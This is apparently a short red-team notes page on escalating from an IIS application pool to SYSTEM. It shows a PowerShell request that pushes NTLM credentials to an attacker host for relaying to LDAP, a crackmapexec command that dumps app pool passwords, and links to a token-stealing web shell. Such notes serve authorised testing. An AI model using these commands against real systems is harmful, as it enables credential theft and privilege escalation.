---
title: IIS
---

Escalate from application pool to system by triggering NTLM authentication over HTTP and [[notes/ad/ntlm-relay-to-ldap|relaying to LDAP]] ([source](https://twitter.com/M4yFly/status/1745581076846690811)).

~~~ ps1
iwr http://attackerpc.corp.local -UseDefaultCredentials
~~~

[[notes/mitre-attack/credential-access|Access Credentials]] of the IIS application pool account as [[notes/windows/credential-access-admin|local admin]] ([source](https://twitter.com/mpgn_x64/status/1693249217609740470)).

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb web01.corp.local -u jdoeadm -p 'passw0rd' -M iis
    ~~~

    If the module can not dump the password of an account it is probably a gMSA.

Untested tools:

- [Handly](https://github.com/blackarrowsec/Handly/tree/main/IIS), ASP.NET web shell that steals and impersonates tokens held by IIS
- [AppPoolCredDecrypt](https://github.com/xpn/RandomTSScripts/tree/master/apppoolcreddecrypt), dump IIS app pool accounts
